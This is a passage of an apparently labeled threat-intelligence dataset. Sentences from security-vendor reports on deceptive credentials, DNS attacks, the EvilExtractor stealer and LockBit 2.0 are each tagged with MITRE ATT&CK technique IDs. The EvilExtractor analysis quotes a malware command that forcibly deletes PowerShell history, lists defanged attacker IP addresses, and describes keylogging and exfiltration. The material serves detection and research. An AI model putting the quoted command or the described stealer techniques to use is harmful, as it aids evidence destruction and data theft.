            "Decoys should also be configured to enable relevant auditing services to be able to generate events.",
            "For instance, the following enables the account logon events to be audited: Decoy machines must be setup to run the log collector agent that can collect the access logs generated and forward them to the correlation server.",
            "However, in the domain joined environment, it is also essential to tune the decoy machines to forward only the relevant logs to the correlation server to minimize false positives. ",
            "The below highlights some of the auditing required to be enabled on the decoy systems for effective correlation. ",
            "Figure 19 \u2013 Basic decoy setup Illustrating and Achieving Network Deception ",
            "The following sections describe some examples of how deception can be achieved in the domain network, along with a visualization of how credential theft can be detected. ",
            "Network Deception \u2013 Example 1: Injecting NETONLY credentials into LSASS process memory LSASS process memory is one of the prime targets for attackers, as well as malware armed with lateral movement capabilities since it caches a variety of credentials.",
            "Credential extraction from the LSASS process requires opening a read handle to the process itself which is closely monitored by EDR products but there are stealthier ways around it. ",
            "One of the primary tasks towards achieving credential-based deception is to stage the deceptive credentials in LSASS process memory.",
            "This can be accomplished on the production and decoy systems by executing a trivial credential injection code which uses the CreateProcessWithLogonW Windows API with the specified crafted credentials.",
            "CreateProcessWithLogonW creates the new logon session using the caller process access token and spawns the process specified as a parameter in the security context of the specified deceptive credentials and it will be staged in the LSASS memory until the process runs in the background.",
            "The below shows the example code calling the API with the specified credentials which is also visible when credentials are extracted with Mimikatz. ",
            "Figure 20 \u2013 Injecting credentials into LSASS memory One of the parameters to CreateProcessWithLogonW is \u201cdwLogonFlags\u201d which should be specified as LOGON_NETCREDENTIALS_ONLY as shown in the code above.",
            "This ensures the specified credentials are used only on the network and not for local logons.",
            "Additionally, NETONLY credentials used to create a logon session are not validated by the system.",
            "Below is a code snapshot from credential extraction tool Mimikatz, using a similar approach to forge a logon session and replacing the credentials with the supplied ones while executing Pass-the-Hash attacks. ",
            "Figure 21 \u2013 Mimikatz code for PTH attack Network Deception \u2013 Example 2: Configure deceptive hostnames for decoy VMs Attackers or malware moving laterally inside the network might do a recon for interesting hostnames via nbtstat/nbtscan.",
            "To deflect the lateral movement path, decoy systems can be configured with real looking hostnames that match the production systems.",
            "These hostnames will then be visible on NetBIOS scans as shown below. ",
            "Figure 22 \u2013 Deceptive host names pointing to decoy machines ",
            "These decoy systems can also run the relevant client applications pointing to the decoy services, with authentication directed to the decoy Domain Controller in the network.",
            "Detection of this attack path happens much earlier, however the decoy network setup keeps the adversaries engaged, helping admins to study their Tools and Techniques. Figure 23 \u2013 Decoy machines running clients pointing to decoy services A similar deception setup can also be done for the browsers where saved credentials can point to the decoy applications and services within the domain.",
            "For instance, Chrome saves the credentials in the SQLite format on the disk which can be decrypted using DPAPI as discussed earlier sections.",
            "The below examples demonstrate deceptive browser credentials which can lure adversaries towards the decoy services. ",
            "Figure 24 \u2013 Inserting deceptive browser credentials ",
            "In addition to some of the techniques discussed above, and many others highlighted in the previous sections, setting up deception involves much more advanced configuration of decoy systems to minimize false positives and needs to be tuned to the environment to accurately identify malicious activities.",
            "Deception can also be configured to address multiple other phases of lateral movement activity including reconnaissance and target discovery, essentially redirecting the adversaries and giving them a path to the target.",
            "Below is a high-level visualization of how the decoy network can look like the domain environment. ",
            "Figure 25 \u2013 Deception network setup On the occasion where one of the domain-joined or public facing systems is compromised, authentication would be attempted to other domain joined systems in the network.",
            "If an authentication is attempted and any of the decoy systems are accessed and logged on, the use of these planted deceptive credentials should be a red flag and something which must be investigated.",
            "The visualization below shows the flow and an event being sent to an administrator on accessing one of the decoy systems. ",
            "Figure 26 \u2013 Deceptive credentials usage for authentication in the domain One such example event of successfully logging on to the decoy system is as shown below: Figure 27 \u2013 Alert send to administrator on using deceptive credentials MITRE ATT&CK Techniques: Credential theft attacks discussed here are mapped by MITRE as below: Technique ID Technique Name Description T1003.001 LSASS Process Memory Attackers may attempt to access LSASS process memory to extract credentials as it stores a variety of credentials.",
            "Administrative privileges are required to access the process memory. ",
            "T1003.002 SAM Database Accessing credentials from SAM database requires SYSTEM level privileges.",
            "Stores credentials for all the local user accounts on the machine. ",
            "T1003.003 NTDS.dit file Contains credentials for all the domain users.",
            "File is present on the DC and domain admin privileges are required to access this file. ",
            "T1003.006 DCSync Attacker can extract the credentials from the DC by impersonating the domain controller and use DRSUAPI protocol to replicate credentials from DC. ",
            "T1558.001 Golden Ticket Attackers acquiring credentials for KRBTGT account can forge the Kerberos ticket called Golden Ticket, allowing them to get unrestricted access to any system in the domain T1558.002 Silver Ticket Allows attacker to get admin level access to the service accounts by abusing Kerberos authentication T1558.003 Kerberoasting Allows attackers to extract the Kerberos tickets for service accounts from memory and brute force offline to get credentials Conclusion As credential theft attacks play a significant role in an attacker\u2019s lateral movement, so as in-network defense for the defenders.",
            "With attackers\u2019 lateral movement tactics evolving and getting more stealthier, defenders will have to adapt to innovative ways of defending the critical network assets.",
            "In\u2013network defense strategies like Deception could prove to be a promising and forward-looking approach towards detecting and mitigating data theft attacks.",
            "Strategic planting of decoy systems within the production network, inserting decoy credentials and decoy contents on calculative selection of endpoints and decoy systems and accurately setting up the logging and correlation via SIEMs for monitoring the use of decoy contents, could certainly detect and mitigate the attacks early in the lateral movement life cycle. ",
            "Endpoint solutions like User Entity Behavior Analytics (UEBA) and Endpoint Detection and Response (EDR) could also play a significant role in building the deception infrastructure.",
            "For instance, one of the ways UEBA solutions could prove useful is to baseline user behavior and monitor access to credential stores on the system.",
            "UEBA/EDR could raise the red flag on injection of forged Kerberos tickets in the memory.",
            "This can provide user level visibility to a greater extent when integrated with SIEM, playing a crucial role in mitigating credential theft attacks. ",
            "The post Detecting Credential Stealing Attacks Through Active In-Network Defense appeared first on McAfee Blog. "
        ],
        "label": [
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1003.001",
                "T1053.005"
            ],
            [
                "T1140"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1055",
                "T1078"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1003.001",
                "T1055"
            ],
            [
                "T1003.001"
            ],
            [
                "T1003.001"
            ],
            [
                "T1106"
            ],
            [],
            [
                "T1003.001",
                "T1106"
            ],
            [
                "T1055"
            ],
            [],
            [],
            [
                "T1003.001"
            ],
            [
                "T1082"
            ],
            [],
            [],
            [],
            [],
            [],
            [
                "T1140"
            ],
            [],
            [],
            [],
            [],
            [],
            [
                "T1190"
            ],
            [],
            [],
            [
                "T1003.001"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            []
        ]
    },
    {
        "doc_title": "Understanding DNS attacks Identifying and patching vulnerabilities  Snyk",
        "cti_report": [
            "title: Understanding DNS attacks: Identifying and patching vulnerabilities | Snyk url: https://snyk.io/blog/dns-attacks-identifying-patching-vulnerabilities/ The Domain Name System (DNS) translates domain names into IP addresses.",
            "Every device and website has an IP address that other devices, websites, and online services use to communicate with it.",
            "IP addresses are a string of numbers usually formatted as 000.000.000.000.",
            "However, we use domain names since people can\u2019t easily remember these numbers.",
            "When we want to visit Google, we simply type the domain name into our browser\u2019s address bar, and the DNS service translates the user-entered domain name \u201cgoogle.com\u201d into the corresponding IP address that a computer uses.",
            "DNS is a fundamental component of the internet infrastructure, as any communication must start with a DNS name resolution.",
            "If the DNS becomes unavailable, internet programs will no longer function.",
            "DNS attacks refer to any attack that targets the stability and security of the DNS infrastructure.",
            "They commonly aim to render the DNS unavailable or intercept and alter the answers provided by the DNS, directing unsuspecting users to malicious websites.",
            "DNS infrastructure contains two components \u2014 authoritative and recursive DNS servers \u2014 and both are open to attack. ",
            "Below, we\u2019ll explore the most common attacks against DNS and review mitigation strategies to avoid them.",
            "Crash course in DNS attacksThere are several types of DNS attacks, each function differently, have unique impacts, and require specific countermeasures. ",
            "SpoofingDNS spoofing occurs when threat actors alter the legitimate DNS server records to redirect users to fraudulent websites instead of their intended destination.",
            "When unsuspecting users reach the fraudulent website, the website prompts them to enter sensitive information, such as login details or credit card information.",
            "Threat actors use this technique to steal the victim\u2019s sensitive data or plant malware \u2014 like ransomware or keyloggers \u2014 on their victim\u2019s device.",
            "Attackers execute DNS spoofing attacks using two methods:Intercepting the communications between the target device and the DNS server and redirecting users\u2019 requests to a malicious websiteDirectly attacking the legitimate DNS server and forcing it to return malicious IP addressesTo counter this attack, we should:Update and patch the DNS server software regularly.",
            "Check the website for the secure connection (padlock) symbol.",
            "This symbol appears next to the address bar of the web browser.",
            "If there\u2019s no padlock, this may indicate threat actors have mirrored the website for malicious purposes. ",
            "Enable the Domain Name System Security Extensions (DNSSEC) on the domain.",
            "These extensions add a layer of security by attaching a digital certificate signature to DNS information. ",
            "Cache poisoningIn this attack, the threat actor injects false DNS information into the DNS cache to force it to return incorrect information and direct users to malicious websites.",
            "For example, when a user requests to visit google.com, the poisoned DNS server returns the IP address of another website that could contain an exploit kit or phishing page.",
            "DNS cache poisoning and spoofing are often used interchangeably in cybersecurity.",
            "However, they are different in terms of their function and order of appearance.",
            "In DNS poisoning, threat actors replace the DNS records to redirect unsuspecting users to malicious destinations.",
            "Then, DNS spoofing redirects unsuspecting users to the malicious website using a poisoned cache.",
            "To prevent a DNS poisoning attack, we should:Use DNSSEC, which uses public key cryptography.",
            "This ensures that only a legitimate DNS nameserver answers a request with the correct DNS information.",
            "Prevent local DNS servers from answering internet-based DNS queries \u2014 unless our DNS nameserver is registered with ICANN.DoS/DDoS/floodingDNS flooding is an attack by which malicious actors try to overwhelm DNS servers with false DNS requests to prevent them from serving legitimate requests.",
            "There are two types of DNS flood attacks: denial of service (DoS) flooding and distributed denial of service (DDoS) flooding.",
            "DoS flood attackIn a DoS flood attack, the attacker uses one computer to flood a remote DNS server with false traffic.",
            "This technique is no longer effective because modern DNS servers have advanced technical specifications that one device cannot disrupt.",
            "DDoS DNS flood attackThe DDoS DNS flood is the most effective attack mechanism wherein attackers use many devices to target one DNS server.",
            "This action consumes the target DNS memory and CPU resources, eventually taking the server offline. ",
            "In cybersecurity, a bot can refer to any computing device, for example, a laptop, workstation, or internet of things (IoT) device infected with malware and under a threat actor\u2019s control.",
            "A collection of these bots is called a botnet.",
            "Attackers commonly use networks of botnets containing thousands or millions of compromised devices that run malicious scripts.",
            "The attacker orchestrates the attack by directing all devices to send traffic simultaneously to one server, generating a DoS status. ",
            "DNS floods are considered relatively modern, made widely possible by the increasing numbers of IoT devices worldwide.",
            "Many IoT devices have poor security configurations, making them easy targets for hackers to control.",
            "To prevent DDoS and DoS flood attacks, we should:Use a DDoS mitigation service to prevent outside attackers from overwhelming our DNS servers with false requests.",
            "Use one dedicated server as the authoritative name server and another as the DNS resolver.",
            "This enables one component to remain operational if the second fails. ",
            "Use a dedicated DNS server.",
            "Small and medium-sized organizations often use one server for multiple purposes, such as hosting applications and running the DNS service.",
            "However, if the attacker accesses one application hosted on the server, they can compromise and alter the DNS settings.",
            "NXDomainLike a DNS flood attack, the NXDomain attack overwhelms the target DNS server with many requests for invalid records (nonexistent domain names).",
            "To execute this attack, attackers use a DNS proxy server that automatically sends a massive number of DNS requests to the targeted authoritative DNS server.",
            "The authoritative server consumes resources (fills the server cache) in resolving these invalid requests, making it respond slowly to legitimate requests \u2014 and eventually stop responding altogether.",
            "To prevent the DNS NXD flood attack, we should:Conduct regular DNS audits.",
            "Blocklist suspicious domain names and servers.",
            "Temporarily blocklist a client\u2019s IP address if it sends too many NXDomain requests.",
            "Increase the Time to Live (TTL) on current DNS records to ensure that they\u2019ll remain for an extended time in external DNS caches.",
            "These records don\u2019t need to be updated regularly.",
            "Amplification attacksThis is another DDoS attack that aims to prevent the target DNS server from serving legitimate DNS queries.",
            "In this attack, threat actors exploit open DNS servers to send multiple responses to the target server.",
            "Threat actors initiate this attack by sending numerous DNS requests to the open DNS server using the target IP address as the source address.",
            "The open DNS server returns the response to the requester (in this example, the target spoofed IP address).",
            "Sending many DNS responses eventually crashes the target server by consuming its network bandwidth and making it unresponsive to legitimate requests.",
            "Attackers commonly leverage botnets, especially on IoT devices, to generate spoofed DNS requests to overwhelm the target servers or organization network with DNS responses.",
            "To prevent this attack, we should:Enforce source IP verifications on all network devices.",
            "Prevent DNS authoritative name servers from functioning as recursive servers.",
            "Enforce response rate limiting (RRL) settings on all DNS servers. ",
            "Configure open DNS resolvers to only respond to queries from a trusted source. ",
            "HijackingIn this attack, threat actors manipulate DNS response queries to direct unsuspecting users to fraudulent or malicious websites.",
            "This attack occurs by:Installing malware, such as a trojan horse, on the victim\u2019s computer to incorrectly resolve DNS queries and lead the unsuspecting user to malicious sitesCompromising the target router and changing its DNS settings.",
            "This affects all users connected to the router. ",
            "Intercepting the communications between the legitimate DNS server and user device \u2014 as in the case of a man-in-the-middle attack \u2014 and manipulating DNS responses to lead the unsuspecting user to malicious sitesTargeting the DNS server directly and then changing its DNS settings to lead unsuspecting users to different URLsAlthough",
            "this attack is malicious, some internet service providers (ISPs) use this technique to direct users to other websites.",
            "For example, some ISPs use it to display advertisements based on a user\u2019s browsing history.",
            "RebindingIn this attack, the threat actor infects the target router with malware to control it remotely.",
            "The attack begins by executing malicious JavaScript code on a user\u2019s browser to infect the router.",
            "Many people don\u2019t protect their router using a complex password \u2014 or just safeguard it using the default factory credentials.",
            "This leaves them vulnerable to rebinding attacks. ",
            "A good first step toward guarding against rebinding attacks is to protect the router with a strong password.",
            "We should also:Change the default router username and password to something difficult to guess.",
            "Keep the DNS server and all client operating systems and installed applications up to date. ",
            "Tunneling This DNS attack routes unsuspecting user traffic to the attacker\u2019s server.",
            "This attack is typical among ransomware operators for facilitating communication with the Command and Control Center (C&C) and exfiltrating data from the target device.",
            "DNS tunneling evades detection by security tools like firewalls.",
            "Threat actors send stolen data from the target network in small chunks and deliver them as a series of DNS queries and responses to avoid detection.",
            "A DNS tunneling attack works as follows:The attacker has a server with a domain name pointing to it.",
            "This server runs tunneling malware.",
            "The attacker infects a computer with malware.",
            "The infected computer might sit behind a company firewall but can use the DNS resolver.",
            "Now, the DNS resolver can communicate with the remote attacker\u2019s C&C server.",
            "By doing this, each infected device and the remote attacker\u2019s server have created a covert channel that can be used to exfiltrate data from the victim device or deliver more malware, such as ransomware, to the target device. ",
            "To prevent this attack, we should:Use advanced security solutions, including next-generation firewalls on network perimeters and network detection and response (NDR), to monitor all interactions within our IT environment.",
            "This enables us to detect APT and ransomware operators and halt communications with attackers\u2019 servers.",
            "Configure all devices within an organization\u2019s network to send all their DNS queries to an internal DNS server that blocks suspicious domain names. ",
            "Phantom domainIn this attack, the threat actor sets up numerous phantom domain names and requests the target DNS server to resolve them.",
            "These domains (commonly a large number of sub-domain names) respond very slowly or never.",
            "After a while, the target DNS server consumes its server cache while waiting for the attacker domain\u2019s responses and eventually becomes unresponsive. ",
            "To prevent this attack, we should:Increase the number of recursive DNS servers.",
            "Limit the number of successive recursive DNS requests on each DNS server.",
            "ConclusionThe DNS service is a critical component of internet infrastructure.",
            "It\u2019s responsible for translating users\u2019 domain names into IP addresses that other servers can understand.",
            "However, it was not made for security.",
            "With the widespread use of the internet and the growing number of cyberattacks, cybercriminals have become increasingly interested in DNS attacks.",
            "Any attack against the DNS service prevents all internet programs from functioning correctly.",
            "Cybercriminals know this and have developed many ways to attack DNS services for malicious purposes. ",
            "There are several different techniques to attack the DNS service, which we can group into two main categories:Attacks that aim to make the DNS service unavailableAttacks that aim to manipulate the DNS records to lead unaware users to malicious destinationsAs this article has demonstrated, each type of DNS attack requires a different set of countermeasures to mitigate it.",
            "However, generally speaking, the keys to preventing DNS attacks include keeping the DNC server software up to date, using a dedicated DNS server to provide the DNS service, increasing the number of recursive DNS servers, and checking for vulnerabilities to mitigate DDoS attacks. "
        ],
        "label": [
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1056.001"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1071.001"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1071.001"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1078"
            ],
            [],
            [],
            [],
            [],
            [],
            [
                "T1041"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [
                "T1041",
                "T1105"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            []
        ]
    },
    {
        "doc_title": "EvilExtractor  AllinOne Stealer",
        "cti_report": [
            "title: EvilExtractor \u2013 All-in-One Stealer url: https://www.fortinet.com/blog/threat-research/evil-extractor-all-in-one-stealer Affected platforms: WindowsImpacted parties: Any organizationImpact: Controls victim\u2019s device and collects sensitive informationSeverity level: Critical EvilExtractor (sometimes spelled Evil Extractor) is an attack tool designed to target Windows operating systems and extract data and files from endpoint devices.",
            "It includes several modules that all work via an FTP service.",
            "It was developed by a company named Kodex, which claims it is an educational tool.",
            "However, research conducted by FortiGuard Labs shows cybercriminals are actively using it as an info stealer. ",
            "Based on our traffic source data to the host, evilextractor[.]com, malicious activity increased significantly in March 2023.",
            "FortiGuard Labs observed this malware in a phishing email campaign on 30 March, which we traced back to the samples included in this blog.",
            "It usually pretends to be a legitimate file, such as an Adobe PDF or Dropbox file, but once loaded, it begins to leverage PowerShell malicious activities.",
            "It also contains environment checking and Anti-VM functions.",
            "Its primary purpose seems to be to steal browser data and information from compromised endpoints and then upload it to the attacker\u2019s FTP server. ",
            "We recently reviewed a version of the malware that was injected into a victim\u2019s system and, as part of that analysis, identified that most of its victims are located in Europe and America.",
            "The developer released its project in October 2022 (Figure 1) and has kept updating it to increase its stability and strengthen its module. ",
            "This article will examine the initial attack method used to deliver EvilExtractor and its functions. Figure 1.",
            "EvilExtractor for sale on the web Initial Access The phishing email with the malicious attachment is shown in Figure 2.",
            "It is disguised as an account confirmation request.",
            "The attacker also tricks the victim by using an Adobe PDF icon for the decompressed file.",
            "The PE header is shown in Figure 3. ",
            "Figure 2.",
            "The phishing email Figure 3.",
            "File header of \"Account_Info.exe\" The execution file is a Python program packaged by PyInstaller.",
            "We extracted it with pyinstxtractor and found that the \u201cPYARMOR\u201d string in its main code file \u201ccontain.pyc\u201d, shown in Figure 4, is an obfuscating tool for Python script that makes the malware harder to be analyzed and detected.",
            "We extracted the key and iv from _pytransform.dll and decrypted the \u201ccontain.pyc\u201d using AES-GCM. Figure 4.",
            "Code in \"contain.pyc\" ",
            "In addition to the Python program, we observed a .NET loader that can extract EvilExtractor.",
            "Figure 5 is part of the code.",
            "It contains Base64-encoded data, which is a PowerShell script.",
            "This execution file is generated from the tool \u201cPS2EXE-GUI\u201d, which can convert PowerShell scripts to EXE Files. ",
            "Figure 5. .Net",
            "Code for EvilExtractor EvilExtractor After decrypting the pyc file, we get the primary code of EvilExtractor.",
            "It is a PowerShell script that contains the following modules: ",
            "Date time checking Anti-Sandbox Anti-VM Anti-Scanner FTP server setting Steal data Upload Stolen data Clear log It first checks whether the system\u2019s date is between 2022-11-09 and 2023-04-12.",
            "If not, it uses the following command to delete the data in PSReadline and terminate: DEL \\\"$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadline\\*\\\" -Force \u2013Recurse It then compares the product model to see if it matches any of the following: VirtualBox, VMWare, Hyper-V, Parallels, Oracle VM VirtualBox, Citrix Hypervisor, QEMU, KVM, Proxmox VE, or Docker, as shown in Figure 6.",
            "It also checks the victim\u2019s hostname against 187 names from VirusTotal machines or other scanner/virtual machines, as shown in Figure 7. Figure 6.",
            "EvilExtractor comparing product model for match Figure 7.",
            "Virtual environment and scanner/virtual machine checking After passing the environment check, EvilExtractor downloads three components from http://193[.]42[.]33[.]232 used for stealing data.",
            "These files are also Python programs that are obfuscated using PyArmor.",
            "The first is \u201cKK2023.zip\u201d, which is used for stealing browser data and saving it in the folder \u201cIMP_Data\u201d.",
            "It can extract cookies from Google Chrome, Microsoft Edge, Opera, and Firefox.",
            "It also collects browser history and passwords from the following browsers: The second file is \u201cConfirm.zip\u201d.",
            "It is a key logger that saves data in the \u201cKeyLogs\u201d folder.",
            "The last file, \u201cMnMs.zip\u201d, is a webcam extractor.",
            "Its corresponding code is shown in Figure 8. Figure 8.",
            "Download components for the Keylogger and Webcam Snapshot functions EvilExtractor also collects system information by PowerShell script, shown in Figure 9.",
            "Figure 10 shows the concatenated data in a text file called \u201cCredentials.txt\u201d. ",
            "Figure 9.",
            "PowerShell script for collecting system information Figure 10.",
            "Content of \u201cCredentials.txt\u201d EvilExtractor downloads files with specific extensions from the Desktop and Download folders, including jpg, png, jpeg, mp4, mpeg, mp3, avi, txt, rtf, xlsx, docx, pptx, pdf, rar, zip, 7z, csv, xml, and html.",
            "It also uses the command \u201cCopyFromScreen\u201d to capture a screenshot.",
            "The code is shown in Figure 11. Figure 11.",
            "Downloading files and getting a screenshot After EvilExtractor extracts all the data from the compromised endpoint, it uploads it to the attacker\u2019s FTP server, shown in Figure 12.",
            "The developer of EvilExtractor also provides an FTP server for those who purchase its malware. Figure 12.",
            "Upload file to attacker\u2019s",
            "FTP server Kodex Ransomware EvilExtractor also has a ransomware function.",
            "It is called \u201cKodex Ransomware\u201d, as shown in Figure 13.",
            "We extracted this PowerShell script from the .Net loader mentioned in the previous section, and the script for its ransomware is similar to the one for its stealer. ",
            "Figure 13.",
            "Introduction form evilextracom[.]com It downloads \u201czzyy.zip\u201d from evilextractor[.]com.",
            "Details of the unzipped file, a 7-zip standalone console, are shown in Figure 14.",
            "Figure 15 shows it leverages \u201c7za.exe\u201d to encrypt files with the parameter \u201c-p\u201d, which means zipping files with a password.",
            "It also generates a ransom-demanding message saved in \u201cKodexRansom\u201d, shown in Figure 16. Figure 14.",
            "File in \"zzyy.zip\" Figure 15.",
            "PowerShell script for Kodex Ransomware Figure 16.",
            "Kodex ransomware's note Conclusion EvilExtractor is being used as a comprehensive info stealer with multiple malicious features, including ransomware.",
            "Its PowerShell script can elude detection in a .NET loader or PyArmor.",
            "Within a very short time, its developer has updated several functions and increased its stability.",
            "This blog explains how threat actors launch an attack via phishing mail and what files are leveraged to extract the EvilExtracrtor PowerShell script.",
            "We also detailed what functions are included, what data can be collected by EvilExtractor, and how the Kodex Ransomware works.",
            "Users should be aware of this new info stealer and continue to be cautious about suspicious mail. ",
            "Figure 17.",
            "Attack Chain Fortinet Protections ",
            "The malware described in this report are detected and blocked by FortiGuard Antivirus as: W32/EvilExtractor.",
            "A!tr W32/Infostealer.",
            "A!tr W32/Keylogger.",
            "A!tr The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR, and the Fortinet AntiVirus engine is a part of each of those solutions.",
            "Customers running current AntiVirus updates are protected. ",
            "The FortiGuard Web Filtering Service blocks the malicious URL and IP address. ",
            "If you think this or any other cybersecurity threat has impacted your organization, contact our Global FortiGuard Incident Response Team. ",
            "IOCs IP Address: 45[.]87[.]81[.]184 193[.]42[.]33[.]232 Files: 352efd1645982b8d23a841107007c8b4b024eb6bb5d6b312e5783ce4aa62b685 023548a5ce0de9f8b748a2fd8c4d1ae6c924c40acbde32e9599c868115d11f4e 75688c32a3c1f04df0fc02491180c8079d7fdc0babed981f5860f22f5e118a5e 826c7c112dd1ae80469ef81f5066003d7691a349e6234c8f8ca9637b0984fc45 b1ef1654839b73f03b73c4ef4e20ce4ecdef2236ec6e1ca36881438bc1758dcd 17672795fb0c8df81ab33f5403e0e8ed15f4b2ac1e8ac9fef1fec4928387a36d "
        ],
        "label": [
            [
                "T1005"
            ],
            [],
            [],
            [],
            [],
            [],
            [
                "T1036.005"
            ],
            [],
            [],
            [
                "T1055"
            ],
            [],
            [],
            [
                "T1566.001"
            ],
            [],
            [],
            [],
            [],
            [],
            [
                "T1027"
            ],
            [
                "T1027"
            ],
            [],
            [],
            [],
            [],
            [
                "T1027"
            ],
            [],
            [],
            [
                "T1140"
            ],
            [],
            [],
            [
                "T1070.004"
            ],
            [
                "T1082"
            ],
            [],
            [
                "T1105"
            ],
            [
                "T1027"
            ],
            [],
            [],
            [
                "T1552.001"
            ],
            [
                "T1056.001"
            ],
            [],
            [],
            [
                "T1056.001"
            ],
            [],
            [],
            [],
            [],
            [
                "T1113"
            ],
            [],
            [
                "T1113"
            ],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            [],
            []
        ]
    },
    {
        "doc_title": "LockBit 20 How This RaaS Operates and How to Protect Against It",
        "cti_report": [
            "title: LockBit 2.0: How This RaaS Operates and How to Protect Against It url: https://unit42.paloaltonetworks.com/lockbit-2-ransomware/ Executive Summary LockBit 2.0 is ransomware as a service (RaaS) that first emerged in June 2021 as an upgrade to its predecessor LockBit (aka ABCD Ransomware), which was first observed in September 2019. ",
            "Since its inception, the LockBit 2.0 RaaS attracted affiliates via recruitment campaigns in underground forums, and thus became particularly prolific during the third quarter of calendar year 2021.",
            "The LockBit 2.0 operators claimed to have the fastest encryption software of any active ransomware strain as of June 2021, claiming accordingly that this added to its effectiveness and ability to disrupt the ransomware landscape. ",
            "While several top-tier RaaS affiliate programs, such as Babuk, DarkSide and REvil (aka Sodinokibi) disappeared from the underground in 2021, LockBit 2.0 continued to operate and gradually became one of the most active ransomware operations.",
            "While Conti was recognized as being the most prolific ransomware deployed in 2021 per our 2022 Unit 42 Ransomware Threat Report, LockBit 2.0 is the most impactful and widely deployed ransomware variant we have observed in all ransomware breaches during the first quarter of 2022, considering both leak site data and data from cases handled by Unit 42 incident responders. ",
            "According to data analysis of ransomware groups\u2019 dark web leak sites, LockBit 2.0 was the most impactful RaaS for five consecutive months.",
            "As of May 25, LockBit 2.0 accounted for 46% of all ransomware-related breach events for 2022.",
            "And the LockBit 2.0 RaaS leak site has the most significant number of published victims, with over 850 in total. ",
            "Additionally, LockBit 2.0 has affected many companies globally, with top victims based in the U.S., Italy and Germany.",
            "Its most highly targeted industry verticals include professional services, construction, wholesale and retail, and manufacturing. ",
            "Palo Alto Networks customers receive protections against LockBit 2.0 attacks from Cortex XDR, as well as from the WildFire cloud-delivered security subscription for the Next-Generation Firewall.",
            "(Please see the Conclusion section for more detail.) ",
            "Table of Contents LockBit 2.0 OverviewVictimologyLeak Site DataUnit 42 Incident Response Data on LockBit 2.0LockBit 2.0 Tactics, Techniques and ProceduresLockBit 2.0 Technical DetailsLockBit 3.0Courses of ActionConclusionAppendix AAdditional Resources LockBit 2.0 Overview LockBit 2.0 is another example of RaaS that leverages double extortion techniques as part of the attack to pressure victims into paying the ransom. ",
            "In some cases, LockBit 2.0 operators have performed DDoS attacks on the victims' infrastructure as well as using a leak site.",
            "This practice is known as triple extortion, a tactic observed in groups like BlackCat, Avaddon and SunCrypt in the past. ",
            "Like other ransomware families such as BlackByte, LockBit 2.0 avoids systems that use Eastern European languages, including many written with Cyrillic alphabets. ",
            "Unlike other RaaS programs that don't require the affiliates to be super technical or savvy, LockBit 2.0 operators allegedly only work with experienced penetration testers, especially those experienced with tools like Metasploit and Cobalt Strike.",
            "Affiliates are tasked with gaining initial access to the victim network, allowing LockBit 2.0 to conduct the rest of the attack. ",
            "LockBit 2.0 has been observed changing infected computers\u2019 backgrounds to a ransomware note.",
            "The ransomware note was also used to recruit insiders from victim organizations.",
            "The notes claimed the threat actors would pay \u201cmillions of dollars\u201d to insiders who provided access to corporate networks or facilitated a ransomware infection by opening a phishing email and/or launching a payload manually.",
            "The threat actors also expressed interest in other access methods such as RDP, VPN and corporate email credentials.",
            "In exchange, they offer a cut of the paid ransom. ",
            "Victimology LockBit 2.0 targets organizations opportunistically.",
            "The operators work with initial access brokers to save time and allow for a larger profit potential.",
            "While typically seeking victims of opportunity, LockBit 2.0 does appear to have victim limitations.",
            "The group announced that they would not target healthcare facilities, social services, educational institutions, charitable organizations and other organizations that \u201ccontribute to the survival of the human race\u201d.",
            "However, despite these claims, there have been instances of affiliates undermining these guidelines by still opting to attack industry verticals such as healthcare and education. ",
            "Organizations in Europe and the U.S. are hit more often by LockBit 2.0 than those in other countries, likely due to the high profitability and insurance payouts. ",
            "Leak Site Data During the first calendar year quarter of 2022, LockBit 2.0 persisted as the most impactful and the most deployed ransomware variant we observed in all ransomware breaches shared on leak sites. ",
            "Figure 1.",
            "Ransomware leak site data from the first calendar year quarter of 2022.According to leak site data analysis, LockBit 2.0 was the most impactful RaaS for five consecutive months.",
